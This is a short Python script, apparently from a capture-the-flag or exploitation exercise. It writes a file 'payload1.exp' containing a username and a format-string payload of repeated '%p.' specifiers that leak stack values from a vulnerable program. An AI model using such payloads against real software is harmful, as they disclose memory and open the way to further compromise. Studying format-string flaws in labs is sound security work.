username = b"yolo\n"
payload = b"%p."*11 + b"\n"

exp_file_name = "payload1.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(username)
exp_out.write(payload)
exp_out.close()
